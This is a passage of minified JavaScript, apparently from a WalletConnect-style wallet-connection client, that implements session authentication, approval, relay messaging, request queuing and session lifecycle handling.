s=r&&this.client.core.linkModeSupportedApps.includes(r)&&((i=this.client.metadata.redirect)==null?void 0:i.linkMode),o=s?Or.link_mode:Or.relay;o===Or.relay&&await this.confirmOnlineStateOrThrow();const{chains:a,statement:c="",uri:l,domain:f,nonce:h,type:m,exp:b,nbf:w,methods:y=[],expiry:E}=n,A=[...n.resources||[]],{topic:R,uri:S}=await this.client.core.pairing.create({methods:["wc_sessionAuthenticate"],transportType:o});this.client.logger.info({message:"Generated new pairing",pairing:{topic:R,uri:S}});const v=await this.client.core.crypto.generateKeyPair(),k=WT(v);if(await Promise.all([this.client.auth.authKeys.set(KT,{responseTopic:k,publicKey:v}),this.client.auth.pairingTopics.set(k,{topic:k,pairingTopic:R})]),await this.client.core.relayer.subscribe(k,{transportType:o}),this.client.logger.info(`sending request to new pairing topic: ${R}`),y.length>0){const{namespace:$}=_f(a[0]);let H=zCe($,"request",y);VT(A)&&(H=VCe(H,A.pop())),A.push(H)}const O=E&&E>bs.wc_sessionAuthenticate.req.ttl?E:bs.wc_sessionAuthenticate.req.ttl,_={authPayload:{type:m??"caip122",chains:a,statement:c,aud:l,domain:f,version:"1",nonce:h,iat:new Date().toISOString(),exp:b,nbf:w,resources:A},requester:{publicKey:v,metadata:this.client.metadata},expiryTimestamp:Ii(O)},I={eip155:{chains:a,methods:[...new Set(["personal_sign",...y])],events:["chainChanged","accountsChanged"]}},T={requiredNamespaces:{},optionalNamespaces:I,relays:[{protocol:"irn"}],pairingTopic:R,proposer:{publicKey:v,metadata:this.client.metadata},expiryTimestamp:Ii(bs.wc_sessionPropose.req.ttl),id:Il()},{done:B,resolve:U,reject:M}=Am(O,"Request expired"),N=Il(),q=Jn("session_connect",T.id),P=Jn("session_request",N),C=async({error:$,session:H})=>{this.events.off(P,j),$?M($):H&&U({session:H})},j=async $=>{var H,L,V;if(await this.deletePendingAuthRequest(N,{message:"fulfilled",code:0}),$.error){const oe=Ur("WC_METHOD_UNSUPPORTED","wc_sessionAuthenticate");return $.error.code===oe.code?void 0:(this.events.off(q,C),M($.error.message))}await this.deleteProposal(T.id),this.events.off(q,C);const{cacaos:G,responder:Z}=$.result,J=[],ne=[];for(const oe of G){await nq({cacao:oe,projectId:this.client.core.projectId})||(this.client.logger.error(oe,"Signature verification failed"),M(Ur("SESSION_SETTLEMENT_FAILED","Signature verification failed")));const{p:ue}=oe,be=VT(ue.resources),Me=[a7(ue.iss)],Te=Ox(ue.iss);if(be){const Oe=rq(be),Ke=iq(be);J.push(...Oe),Me.push(...Ke)}for(const Oe of Me)ne.push(`${Oe}:${Te}`)}const re=await this.client.core.crypto.generateSharedKey(v,Z.publicKey);let le;J.length>0&&(le={topic:re,acknowledged:!0,self:{publicKey:v,metadata:this.client.metadata},peer:Z,controller:Z.publicKey,expiry:Ii(cb),requiredNamespaces:{},optionalNamespaces:{},relay:{protocol:"irn"},pairingTopic:R,namespaces:Pq([...new Set(J)],[...new Set(ne)]),transportType:o},await this.client.core.relayer.subscribe(re,{transportType:o}),await this.client.session.set(re,le),R&&await this.client.core.pairing.updateMetadata({topic:R,metadata:Z.metadata}),le=this.client.session.get(re)),(H=this.client.metadata.redirect)!=null&&H.linkMode&&(L=Z.metadata.redirect)!=null&&L.linkMode&&(V=Z.metadata.redirect)!=null&&V.universal&&r&&(this.client.core.addLinkModeSupportedApp(Z.metadata.redirect.universal),this.client.session.update(re,{transportType:Or.link_mode})),U({auths:G,session:le})};this.events.once(q,C),this.events.once(P,j);let z;try{if(s){const $=Iu("wc_sessionAuthenticate",_,N);this.client.core.history.set(R,$);const H=await this.client.core.crypto.encode("",$,{type:rA,encoding:hp});z=K3(r,R,H)}else await Promise.all([this.sendRequest({topic:R,method:"wc_sessionAuthenticate",params:_,expiry:n.expiry,throwOnFailedPublish:!0,clientRpcId:N}),this.sendRequest({topic:R,method:"wc_sessionPropose",params:T,expiry:bs.wc_sessionPropose.req.ttl,throwOnFailedPublish:!0,clientRpcId:T.id})])}catch($){throw this.events.off(q,C),this.events.off(P,j),$}return await this.setProposal(T.id,T),await this.setAuthRequest(N,{request:ws(zn({},_),{verifyContext:{}}),pairingTopic:R,transportType:o}),{uri:z??S,response:B}}),We(this,"approveSessionAuthenticate",async n=>{const{id:r,auths:i}=n,s=this.client.core.eventClient.createEvent({properties:{topic:r.toString(),trace:[Z0.authenticated_session_approve_started]}});try{this.isInitialized()}catch(E){throw s.setError(Pv.no_internet_connection),E}const o=this.getPendingAuthRequest(r);if(!o)throw s.setError(Pv.authenticated_session_pending_request_not_found),new Error(`Could not find pending auth request with id ${r}`);const a=o.transportType||Or.relay;a===Or.relay&&await this.confirmOnlineStateOrThrow();const c=o.requester.publicKey,l=await this.client.core.crypto.generateKeyPair(),f=WT(c),h={type:Af,receiverPublicKey:c,senderPublicKey:l},m=[],b=[];for(const E of i){if(!await nq({cacao:E,projectId:this.client.core.projectId})){s.setError(Pv.invalid_cacao);const k=Ur("SESSION_SETTLEMENT_FAILED","Signature verification failed");throw await this.sendError({id:r,topic:f,error:k,encodeOpts:h}),new Error(k.message)}s.addTrace(Z0.cacaos_verified);const{p:A}=E,R=VT(A.resources),S=[a7(A.iss)],v=Ox(A.iss);if(R){const k=rq(R),O=iq(R);m.push(...k),S.push(...O)}for(const k of S)b.push(`${k}:${v}`)}const w=await this.client.core.crypto.generateSharedKey(l,c);s.addTrace(Z0.create_authenticated_session_topic);let y;if(m?.length>0){y={topic:w,acknowledged:!0,self:{publicKey:l,metadata:this.client.metadata},peer:{publicKey:c,metadata:o.requester.metadata},controller:c,expiry:Ii(cb),authentication:i,requiredNamespaces:{},optionalNamespaces:{},relay:{protocol:"irn"},pairingTopic:o.pairingTopic,namespaces:Pq([...new Set(m)],[...new Set(b)]),transportType:a},s.addTrace(Z0.subscribing_authenticated_session_topic);try{await this.client.core.relayer.subscribe(w,{transportType:a})}catch(E){throw s.setError(Pv.subscribe_authenticated_session_topic_failure),E}s.addTrace(Z0.subscribe_authenticated_session_topic_success),await this.client.session.set(w,y),s.addTrace(Z0.store_authenticated_session),await this.client.core.pairing.updateMetadata({topic:o.pairingTopic,metadata:o.requester.metadata})}s.addTrace(Z0.publishing_authenticated_session_approve);try{await this.sendResult({topic:f,id:r,result:{cacaos:i,responder:{publicKey:l,metadata:this.client.metadata}},encodeOpts:h,throwOnFailedPublish:!0,appLink:this.getAppLinkIfEnabled(o.requester.metadata,a)})}catch(E){throw s.setError(Pv.authenticated_session_approve_publish_failure),E}return await this.client.auth.requests.delete(r,{message:"fulfilled",code:0}),await this.client.core.pairing.activate({topic:o.pairingTopic}),this.client.core.eventClient.deleteEvent({eventId:s.eventId}),{session:y}}),We(this,"rejectSessionAuthenticate",async n=>{this.isInitialized();const{id:r,reason:i}=n,s=this.getPendingAuthRequest(r);if(!s)throw new Error(`Could not find pending auth request with id ${r}`);s.transportType===Or.relay&&await this.confirmOnlineStateOrThrow();const o=s.requester.publicKey,a=await this.client.core.crypto.generateKeyPair(),c=WT(o),l={type:Af,receiverPublicKey:o,senderPublicKey:a};await this.sendError({id:r,topic:c,error:i,encodeOpts:l,rpcOpts:bs.wc_sessionAuthenticate.reject,appLink:this.getAppLinkIfEnabled(s.requester.metadata,s.transportType)}),await this.client.auth.requests.delete(r,{message:"rejected",code:0}),await this.deleteProposal(r)}),We(this,"formatAuthMessage",n=>{this.isInitialized();const{request:r,iss:i}=n;return Gse(r,i)}),We(this,"processRelayMessageCache",()=>{setTimeout(async()=>{if(this.relayMessageCache.length!==0)for(;this.relayMessageCache.length>0;)try{const n=this.relayMessageCache.shift();n&&await this.onRelayMessage(n)}catch(n){this.client.logger.error(n)}},50)}),We(this,"cleanupDuplicatePairings",async n=>{if(n.pairingTopic)try{const r=this.client.core.pairing.pairings.get(n.pairingTopic),i=this.client.core.pairing.pairings.getAll().filter(s=>{var o,a;return((o=s.peerMetadata)==null?void 0:o.url)&&((a=s.peerMetadata)==null?void 0:a.url)===n.peer.metadata.url&&s.topic&&s.topic!==r.topic});if(i.length===0)return;this.client.logger.info(`Cleaning up ${i.length} duplicate pairing(s)`),await Promise.all(i.map(s=>this.client.core.pairing.disconnect({topic:s.topic}))),this.client.logger.info("Duplicate pairings clean up finished")}catch(r){this.client.logger.error(r)}}),We(this,"deleteSession",async n=>{var r;const{topic:i,expirerHasDeleted:s=!1,emitEvent:o=!0,id:a=0}=n,{self:c}=this.client.session.get(i);await this.client.core.relayer.unsubscribe(i),await this.client.session.delete(i,Ur("USER_DISCONNECTED")),this.addToRecentlyDeleted(i,"session"),this.client.core.crypto.keychain.has(c.publicKey)&&await this.client.core.crypto.deleteKeyPair(c.publicKey),this.client.core.crypto.keychain.has(i)&&await this.client.core.crypto.deleteSymKey(i),s||this.client.core.expirer.del(i),this.client.core.storage.removeItem(pV).catch(l=>this.client.logger.warn(l)),i===((r=this.sessionRequestQueue.queue[0])==null?void 0:r.topic)&&(this.sessionRequestQueue.state=_l.idle),await Promise.all(this.getPendingSessionRequests().filter(l=>l.topic===i).map(l=>this.deletePendingSessionRequest(l.id,Ur("USER_DISCONNECTED")))),o&&this.client.events.emit("session_delete",{id:a,topic:i})}),We(this,"deleteProposal",async(n,r)=>{if(r)try{const i=this.client.proposal.get(n);this.client.core.eventClient.getEvent({topic:i.pairingTopic})?.setError(K0.proposal_expired)}catch{}await Promise.all([this.client.proposal.delete(n,Ur("USER_DISCONNECTED")),r?Promise.resolve():this.client.core.expirer.del(n)]),this.addToRecentlyDeleted(n,"proposal")}),We(this,"deletePendingSessionRequest",async(n,r,i=!1)=>{await Promise.all([this.client.pendingRequest.delete(n,r),i?Promise.resolve():this.client.core.expirer.del(n)]),this.addToRecentlyDeleted(n,"request"),this.sessionRequestQueue.queue=this.sessionRequestQueue.queue.filter(s=>s.id!==n),i&&(this.sessionRequestQueue.state=_l.idle,this.client.events.emit("session_request_expire",{id:n}))}),We(this,"deletePendingAuthRequest",async(n,r,i=!1)=>{await Promise.all([this.client.auth.requests.delete(n,r),i?Promise.resolve():this.client.core.expirer.del(n)])}),We(this,"setExpiry",async(n,r)=>{this.client.session.keys.includes(n)&&(this.client.core.expirer.set(n,r),await this.client.session.update(n,{expiry:r}))}),We(this,"setProposal",async(n,r)=>{this.client.core.expirer.set(n,Ii(bs.wc_sessionPropose.req.ttl)),await this.client.proposal.set(n,r)}),We(this,"setAuthRequest",async(n,r)=>{const{request:i,pairingTopic:s,transportType:o=Or.relay}=r;this.client.core.expirer.set(n,i.expiryTimestamp),await this.client.auth.requests.set(n,{authPayload:i.authPayload,requester:i.requester,expiryTimestamp:i.expiryTimestamp,id:n,pairingTopic:s,verifyContext:i.verifyContext,transportType:o})}),We(this,"setPendingSessionRequest",async n=>{const{id:r,topic:i,params:s,verifyContext:o}=n,a=s.request.expiryTimestamp||Ii(bs.wc_sessionRequest.req.ttl);this.client.core.expirer.set(r,a),await this.client.pendingRequest.set(r,{id:r,topic:i,params:s,verifyContext:o})}),We(this,"sendRequest",async n=>{const{topic:r,method:i,params:s,expiry:o,relayRpcId:a,clientRpcId:c,throwOnFailedPublish:l,appLink:f,tvf:h,publishOpts:m={}}=n,b=Iu(i,s,c);let w;const y=!!f;try{const R=y?hp:Yo;w=await this.client.core.crypto.encode(r,b,{encoding:R})}catch(R){throw await this.cleanup(),this.client.logger.error(`sendRequest() -> core.crypto.encode() for topic ${r} failed`),R}let E;if(LRe.includes(i)){const R=Pc(JSON.stringify(b)),S=Pc(w);E=await this.client.core.verify.register({id:S,decryptedId:R})}const A=zn(zn({},bs[i].req),m);if(A.attestation=E,o&&(A.ttl=o),a&&(A.id=a),this.client.core.history.set(r,b),y){const R=K3(f,r,w);await global.Linking.openURL(R,this.client.name)}else A.tvf=ws(zn({},h),{correlationId:b.id}),l?(A.internal=ws(zn({},A.internal),{throwOnFailedPublish:!0}),await this.client.core.relayer.publish(r,w,A)):this.client.core.relayer.publish(r,w,A).catch(R=>this.client.logger.error(R));return b.id}),We(this,"sendProposeSession",async n=>{const{proposal:r,publishOpts:i}=n,s=Iu("wc_sessionPropose",r,r.id);this.client.core.history.set(r.pairingTopic,s);const o=await this.client.core.crypto.encode(r.pairingTopic,s,{encoding:Yo}),a=Pc(JSON.stringify(s)),c=Pc(o),l=await this.client.core.verify.register({id:c,decryptedId:a});await this.client.core.relayer.publishCustom({payload:{pairingTopic:r.pairingTopic,sessionProposal:o},opts:ws(zn({},i),{publishMethod:"wc_proposeSession",attestation:l})})}),We(this,"sendApproveSession",async n=>{const{sessionTopic:r,pairingProposalResponse:i,proposal:s,sessionSettleRequest:o,publishOpts:a}=n,c=d_(s.id,i),l=await this.client.core.crypto.encode(s.pairingTopic,c,{encoding:Yo}),f=Iu("wc_sessionSettle",o,a?.id),h=await this.client.core.crypto.encode(r,f,{encoding:Yo});this.client.core.history.set(r,f),await this.client.core.relayer.publishCustom({payload:{sessionTopic:r,pairingTopic:s.pairingTopic,sessionProposalResponse:l,sessionSettlementRequest:h},opts:ws(zn({},a),{publishMethod:"wc_approveSession"})})}),We(this,"sendResult",async n=>{const{id:r,topic:i,result:s,throwOnFailedPublish:o,encodeOpts:a,appLink:c}=n,l=d_(r,s);let f;const h=c&&typeof(global==null?void 0:global.Linking)<"u";try{const w=h?hp:Yo;f=await this.client.core.crypto.encode(i,l,ws(zn({},a||{}),{encoding:w}))}catch(w){throw await this.cleanup(),this.client.logger.error(`sendResult() -> core.crypto.encode() for topic ${i} failed`),w}let m,b;try{m=await this.client.core.history.get(i,r);const w=m.request;try{b=this.getTVFParams(r,w.params,s)}catch(y){this.client.logger.warn(`sendResult() -> getTVFParams() failed: ${y?.message}`)}}catch(w){throw this.client.logger.error(`sendResult() -> history.get(${i}, ${r}) failed`),w}if(h){const w=K3(c,i,f);await global.Linking.openURL(w,this.client.name)}else{const w=m.request.method,y=bs[w].res;y.tvf=ws(zn({},b),{correlationId:r}),o?(y.internal=ws(zn({},y.internal),{throwOnFailedPublish:!0}),await this.client.core.relayer.publish(i,f,y)):this.client.core.relayer.publish(i,f,y).catch(E=>this.client.logger.error(E))}await this.client.core.history.resolve(l)}),We(this,"sendError",async n=>{const{id:r,topic:i,error:s,encodeOpts:o,rpcOpts:a,appLink:c}=n,l=s8(r,s);let f;const h=c&&typeof(global==null?void 0:global.Linking)<"u";try{const b=h?hp:Yo;f=await this.client.core.crypto.encode(i,l,ws(zn({},o||{}),{encoding:b}))}catch(b){throw await this.cleanup(),this.client.logger.error(`sendError() -> core.crypto.encode() for topic ${i} failed`),b}let m;try{m=await this.client.core.history.get(i,r)}catch(b){throw this.client.logger.error(`sendError() -> history.get(${i}, ${r}) failed`),b}if(h){const b=K3(c,i,f);await global.Linking.openURL(b,this.client.name)}else{const b=m.request.method,w=a||bs[b].res;this.client.core.relayer.publish(i,f,w)}await this.client.core.history.resolve(l)}),We(this,"cleanup",async()=>{const n=[],r=[];this.client.session.getAll().forEach(i=>{let s=!1;Ol(i.expiry)&&(s=!0),this.client.core.crypto.keychain.has(i.topic)||(s=!0),s&&n.push(i.topic)}),this.client.proposal.getAll().forEach(i=>{Ol(i.expiryTimestamp)&&r.push(i.id)}),await Promise.all([...n.map(i=>this.deleteSession({topic:i})),...r.map(i=>this.deleteProposal(i))])}),We(this,"onProviderMessageEvent",async n=>{!this.initialized||this.relayMessageCache.length>0?this.relayMessageCache.push(n):await this.onRelayMessage(n)}),We(this,"onRelayEventRequest",async n=>{this.requestQueue.queue.push(n),await this.processRequestsQueue()}),We(this,"processRequestsQueue",async()=>{if(this.requestQueue.state===_l.active){this.client.logger.info("Request queue already active, skipping...");return}for(this.client.logger.info(`Request queue starting with ${this.requestQueue.queue.length} requests`);this.requestQueue.queue.length>0;){this.requestQueue.state=_l.active;const n=this.requestQueue.queue.shift();if(n)try{await this.processRequest(n)}catch(r){this.client.logger.warn(r)}}this.requestQueue.state=_l.idle}),We(this,"processRequest",async n=>{const{topic:r,payload:i,attestation:s,transportType:o,encryptedId:a}=n,c=i.method;if(!this.shouldIgnorePairingRequest({topic:r,requestMethod:c}))switch(c){case"wc_sessionPropose":return await this.onSessionProposeRequest({topic:r,payload:i,attestation:s,encryptedId:a});case"wc_sessionSettle":return await this.onSessionSettleRequest(r,i);case"wc_sessionUpdate":return await this.onSessionUpdateRequest(r,i);case"wc_sessionExtend":return await this.onSessionExtendRequest(r,i);case"wc_sessionPing":return await this.onSessionPingRequest(r,i);case"wc_sessionDelete":return await this.onSessionDeleteRequest(r,i);case"wc_sessionRequest":return await this.onSessionRequest({topic:r,payload:i,attestation:s,encryptedId:a,transportType:o});case"wc_sessionEvent":return await this.onSessionEventRequest(r,i);case"wc_sessionAuthenticate":return await this.onSessionAuthenticateRequest({topic:r,payload:i,attestation:s,encryptedId:a,transportType:o});default:return this.client.logger.info(`Unsupported request method ${c}`)}}),We(this,"onRelayEventResponse",async n=>{const{topic:r,payload:i,transportType:s}=n,o=(await this.client.core.history.get(r,i.id)).request.method;switch(o){case"wc_sessionPropose":return this.onSessionProposeResponse(r,i,s);case"wc_sessionSettle":return this.onSessionSettleResponse(r,i);case"wc_sessionUpdate":return this.onSessionUpdateResponse(r,i);case"wc_sessionExtend":return this.onSessionExtendResponse(r,i);case"wc_sessionPing":return this.onSessionPingResponse(r,i);case"wc_sessionRequest":return this.onSessionRequestResponse(r,i);case"wc_sessionAuthenticate":return this.onSessionAuthenticateResponse(r,i);default:return this.client.logger.info(`Unsupported response method ${o}`)}}),We(this,"onRelayEventUnknownPayload",n=>{const{topic:r}=n,{message:i}=Xe("MISSING_OR_INVALID",`Decoded payload on topic ${r} is not identifiable as a JSON-RPC request or a response.`);throw new Error(i)}),We(this,"shouldIgnorePairingRequest",n=>{const{topic:r,requestMethod:i}=n,s=this.expectedPairingMethodMap.get(r);return!s||s.includes(i)?!1:!!(s.includes("wc_sessionAuthenticate")&&this.client.events.listenerCount("session_authenticate")>0)}),We(this,"onSessionProposeRequest",async n=>{const{topic:r,payload:i,attestation:s,encryptedId:o}=n,{params:a,id:c}=i;try{const l=this.client.core.eventClient.getEvent({topic:r});this.client.events.listenerCount("session_proposal")===0&&(console.warn("No listener for session_proposal event"),l?.setError(of.proposal_listener_not_found)),this.isValidConnect(zn({},i.params));const f=a.expiryTimestamp||Ii(bs.wc_sessionPropose.req.ttl),h=zn({id:c,pairingTopic:r,expiryTimestamp:f,attestation:s,encryptedId:o},a);await this.setProposal(c,h);const m=await this.getVerifyContext({attestationId:s,hash:Pc(JSON.stringify(i)),encryptedId:o,metadata:h.proposer.metadata});l?.addTrace(xl.emit_session_proposal),this.client.events.emit("session_proposal",{id:c,params:h,verifyContext:m})}catch(l){await this.sendError({id:c,topic:r,error:l,rpcOpts:bs.wc_sessionPropose.autoReject}),this.client.logger.error(l)}}),We(this,"onSessionProposeResponse",async(n,r,i)=>{const{id:s}=r;if(Rl(r)){const{result:o}=r;this.client.logger.trace({type:"method",method:"onSessionProposeResponse",result:o});const a=this.client.proposal.get(s);this.client.logger.trace({type:"method",method:"onSessionProposeResponse",proposal:a});const c=a.proposer.publicKey;this.client.logger.trace({type:"method",method:"onSessionProposeResponse",selfPublicKey:c});const l=o.responderPublicKey;this.client.logger.trace({type:"method",method:"onSessionProposeResponse",peerPublicKey:l});const f=await this.client.core.crypto.generateSharedKey(c,l);this.pendingSessions.set(s,{sessionTopic:f,pairingTopic:n,proposalId:s,publicKey:c});const h=await this.client.core.relayer.subscribe(f,{transportType:i});this.client.logger.trace({type:"method",method:"onSessionProposeResponse",subscriptionId:h}),await this.client.core.pairing.activate({topic:n})}else if(Nc(r)){await this.deleteProposal(s);const o=Jn("session_connect",s);if(this.events.listenerCount(o)===0)throw new Error(`emitting ${o} without any listeners, 954`);this.events.emit(o,{error:r.error})}}),We(this,"onSessionSettleRequest",async(n,r)=>{const{id:i,params:s}=r;try{this.isValidSessionSettleRequest(s);const{relay:o,controller:a,expiry:c,namespaces:l,sessionProperties:f,scopedProperties:h,sessionConfig:m,proposalRequestsResponses:b}=r.params,w=[...this.pendingSessions.values()].find(A=>A.sessionTopic===n);if(!w)return this.client.logger.error(`Pending session not found for topic ${n}`);const y=this.client.proposal.get(w.proposalId),E=ws(zn(zn(zn({topic:n,relay:o,expiry:c,namespaces:l,acknowledged:!0,pairingTopic:w.pairingTopic,requiredNamespaces:y.requiredNamespaces,optionalNamespaces:y.optionalNamespaces,controller:a.publicKey,self:{publicKey:w.publicKey,metadata:this.client.metadata},peer:{publicKey:a.publicKey,metadata:a.metadata}},f&&{sessionProperties:f}),h&&{scopedProperties:h}),m&&{sessionConfig:m}),{transportType:Or.relay,authentication:b?.authentication,walletPayResult:b?.walletPay});await this.client.session.set(E.topic,E),await this.setExpiry(E.topic,E.expiry),await this.client.core.pairing.updateMetadata({topic:w.pairingTopic,metadata:E.peer.metadata}),this.pendingSessions.delete(w.proposalId),this.deleteProposal(w.proposalId,!1),this.cleanupDuplicatePairings(E),await this.sendResult({id:r.id,topic:n,throwOnFailedPublish:!0,result:!0}),this.client.events.emit("session_connect",{session:E}),this.events.emit(Jn("session_connect",w.proposalId),{session:E})}catch(o){await this.sendError({id:i,topic:n,error:o}),this.client.logger.error(o)}}),We(this,"onSessionSettleResponse",async(n,r)=>{const{id:i}=r;Rl(r)?(await this.client.session.update(n,{acknowledged:!0}),this.events.emit(Jn("session_approve",i),{})):Nc(r)&&(await this.client.session.delete(n,Ur("USER_DISCONNECTED")),this.events.emit(Jn("session_approve",i),{error:r.error}))}),We(this,"onSessionUpdateRequest",async(n,r)=>{const{params:i,id:s}=r;try{const o=`${n}_session_update`,a=Iv.get(o);if(a&&this.isRequestOutOfSync(a,s)){this.client.logger.warn(`Discarding out of sync request - ${s}`),this.sendError({id:s,topic:n,error:Ur("INVALID_UPDATE_REQUEST")});return}this.isValidUpdate(zn({topic:n},i));try{Iv.set(o,s),await this.client.session.update(n,{namespaces:i.namespaces}),await this.sendResult({id:s,topic:n,result:!0})}catch(c){throw Iv.delete(o),c}this.client.events.emit("session_update",{id:s,topic:n,params:i})}catch(o){await this.sendError({id:s,topic:n,error:o}),this.client.logger.error(o)}}),We(this,"isRequestOutOfSync",(n,r)=>r.toString().slice(0,-3)<n.toString().slice(0,-3)),We(this,"onSessionUpdateResponse",(n,r)=>{const{id:i}=r,s=Jn("session_update",i);if(this.events.listenerCount(s)===0)throw new Error(`emitting ${s} without any listeners`);Rl(r)?this.events.emit(Jn("session_update",i),{}):Nc(r)&&this.events.emit(Jn("session_update",i),{error:r.error})}),We(this,"onSessionExtendRequest",async(n,r)=>{const{id:i}=r;try{this.isValidExtend({topic:n}),await this.setExpiry(n,Ii(cb)),await this.sendResult({id:i,topic:n,result:!0}),this.client.events.emit("session_extend",{id:i,topic:n})}catch(s){await this.sendError({id:i,topic:n,error:s}),this.client.logger.error(s)}}),We(this,"onSessionExtendResponse",(n,r)=>{const{id:i}=r,s=Jn("session_extend",i);if(this.events.listenerCount(s)===0)throw new Error(`emitting ${s} without any listeners`);Rl(r)?this.events.emit(Jn("session_extend",i),{}):Nc(r)&&this.events.emit(Jn("session_extend",i),{error:r.error})}),We(this,"onSessionPingRequest",async(n,r)=>{const{id:i}=r;try{this.isValidPing({topic:n}),await this.sendResult({id:i,topic:n,result:!0,throwOnFailedPublish:!0}),this.client.events.emit("session_ping",{id:i,topic:n})}catch(s){await this.sendError({id:i,topic:n,error:s}),this.client.logger.error(s)}}),We(this,"onSessionPingResponse",(n,r)=>{const{id:i}=r,s=Jn("session_ping",i);setTimeout(()=>{if(this.events.listenerCount(s)===0)throw new Error(`emitting ${s} without any listeners 2176`);Rl(r)?this.events.emit(Jn("session_ping",i),{}):Nc(r)&&this.events.emit(Jn("session_ping",i),{error:r.error})},500)}),We(this,"onSessionDeleteRequest",async(n,r)=>{const{id:i}=r;try{await this.isValidDisconnect({topic:n,reason:r.params}),this.cleanupPendingSentRequestsForTopic({topic:n,error:Ur("USER_DISCONNECTED")}),await this.deleteSession({topic:n,id:i})}catch(s){this.client.logger.error(s)}}),We(this,"onSessionRequest",async n=>{var r,i,s;const{topic:o,payload:a,attestation:c,encryptedId:l,transportType:f}=n,{id:h,params:m}=a;try{await this.isValidRequest(zn({topic:o},m));const b=this.client.session.get(o),w=await this.getVerifyContext({attestationId:c,hash:Pc(JSON.stringify(Iu("wc_sessionRequest",m,h))),encryptedId:l,metadata:b.peer.metadata,transportType:f}),y={id:h,topic:o,params:m,verifyContext:w};await this.setPendingSessionRequest(y),f===Or.link_mode&&(r=b.peer.metadata.redirect)!=null&&r.universal&&this.client.core.addLinkModeSupportedApp((i=b.peer.metadata.redirect)==null?void 0:i.universal),(s=this.client.signConfig)!=null&&s.disableRequestQueue?this.emitSessionRequest(y):(this.addSessionRequestToSessionRequestQueue(y),this.processSessionRequestQueue())}catch(b){await this.sendError({id:h,topic:o,error:b}),this.client.logger.error(b)}}),We(this,"onSessionRequestResponse",(n,r)=>{const{id:i}=r,s=Jn("session_request",i);if(this.events.listenerCount(s)===0)throw new Error(`emitting ${s} without any listeners`);Rl(r)?this.events.emit(Jn("session_request",i),{result:r.result}):Nc(r)&&this.events.emit(Jn("session_request",i),{error:r.error})}),We(this,"onSessionEventRequest",async(n,r)=>{const{id:i,params:s}=r;try{const o=`${n}_session_event_${s.event.name}`,a=Iv.get(o);if(a&&this.isRequestOutOfSync(a,i)){this.client.logger.info(`Discarding out of sync request - ${i}`);return}this.isValidEmit(zn({topic:n},s)),this.client.events.emit("session_event",{id:i,topic:n,params:s}),Iv.set(o,i)}catch(o){await this.sendError({id:i,topic:n,error:o}),this.client.logger.error(o)}}),We(this,"onSessionAuthenticateResponse",(n,r)=>{const{id:i}=r;this.client.logger.trace({type:"method",method:"onSessionAuthenticateResponse",topic:n,payload:r}),Rl(r)?this.events.emit(Jn("session_request",i),{result:r.result}):Nc(r)&&this.events.emit(Jn("session_request",i),{error:r.error})}),We(this,"onSessionAuthenticateRequest",async n=>{var r;const{topic:i,payload:s,attestation:o,encryptedId:a,transportType:c}=n;try{const{requester:l,authPayload:f,expiryTimestamp:h}=s.params,m=await this.getVerifyContext({attestationId:o,hash:Pc(JSON.stringify(s)),encryptedId:a,metadata:l.metadata,transportType:c}),b={requester:l,pairingTopic:i,id:s.id,authPayload:f,verifyContext:m,expiryTimestamp:h};await this.setAuthRequest(s.id,{request:b,pairingTopic:i,transportType:c}),c===Or.link_mode&&(r=l.metadata.redirect)!=null&&r.universal&&this.client.core.addLinkModeSupportedApp(l.metadata.redirect.universal),this.client.events.emit("session_authenticate",{topic:i,params:s.params,id:s.id,verifyContext:m})}catch(l){this.client.logger.error(l);const f=s.params.requester.publicKey,h=await this.client.core.crypto.generateKeyPair(),m=this.getAppLinkIfEnabled(s.params.requester.metadata,c),b={type:Af,receiverPublicKey:f,senderPublicKey:h};await this.sendError({id:s.id,topic:i,error:l,encodeOpts:b,rpcOpts:bs.wc_sessionAuthenticate.autoReject,appLink:m})}}),We(this,"addSessionRequestToSessionRequestQueue",n=>{this.sessionRequestQueue.queue.push(n)}),We(this,"cleanupAfterResponse",n=>{this.deletePendingSessionRequest(n.response.id,{message:"fulfilled",code:0}),setTimeout(()=>{this.sessionRequestQueue.state=_l.idle,this.processSessionRequestQueue()},Ye.toMiliseconds(this.requestQueueDelay))}),We(this,"cleanupPendingSentRequestsForTopic",({topic:n,error:r})=>{const i=this.client.core.history.pending;i.length>0&&i.filter(s=>s.topic===n&&s.request.method==="wc_sessionRequest").forEach(s=>{this.events.emit(Jn("session_request",s.request.id),{error:r})})}),We(this,"processSessionRequestQueue",()=>{if(this.sessionRequestQueue.state===_l.active){this.client.logger.info("session request queue is already active.");return}const n=this.sessionRequestQueue.queue[0];if(!n){this.client.logger.info("session request queue is empty.");return}try{this.emitSessionRequest(n)}catch(r){this.client.logger.error(r)}}),We(this,"emitSessionRequest",n=>{if(this.emittedSessionRequests.has(n.id)){this.client.logger.warn({id:n.id},`Skipping emitting \`session_request\` event for duplicate request. id: ${n.id}`);return}this.sessionRequestQueue.state=_l.active,this.emittedSessionRequests.add(n.id),this.client.events.emit("session_request",n)}),We(this,"onPairingCreated",n=>{if(n.methods&&this.expectedPairingMethodMap.set(n.topic,n.methods),n.active)return;const r=this.client.proposal.getAll().find(i=>i.pairingTopic===n.topic);r&&this.onSessionProposeRequest({topic:n.topic,payload:Iu("wc_sessionPropose",ws(zn({},r),{requiredNamespaces:r.requiredNamespaces,optionalNamespaces:r.optionalNamespaces,relays:r.relays,proposer:r.proposer,sessionProperties:r.sessionProperties,scopedProperties:r.scopedProperties}),r.id),attestation:r.attestation,encryptedId:r.encryptedId})}),We(this,"isValidConnect",async n=>{if(!Wo(n)){const{message:l}=Xe("MISSING_OR_INVALID",`connect() params: ${JSON.stringify(n)}`);throw new Error(l)}const{pairingTopic:r,requiredNamespaces:i,optionalNamespaces:s,sessionProperties:o,scopedProperties:a,relays:c}=n;if(es(r)||await this.isValidPairingTopic(r),!tTe(c)){const{message:l}=Xe("MISSING_OR_INVALID",`connect() relays: ${c}`);throw new Error(l)}if(i&&!es(i)&&Fl(i)!==0){const l="requiredNamespaces are deprecated and are automatically assigned to optionalNamespaces";["fatal","error","silent"].includes(this.client.logger.level)?console.warn(l):this.client.logger.warn(l),this.validateNamespaces(i,"requiredNamespaces")}if(s&&!es(s)&&Fl(s)!==0&&this.validateNamespaces(s,"optionalNamespaces"),o&&!es(o)&&this.validateSessionProps(o,"sessionProperties"),a&&!es(a)){this.validateSessionProps(a,"scopedProperties");const l=Object.keys(i||{}).concat(Object.keys(s||{}));if(!Object.keys(a).every(f=>l.includes(f.split(":")[0])))throw new Error(`Scoped properties must be a subset of required/optional namespaces, received: ${JSON.stringify(a)}, required/optional namespaces: 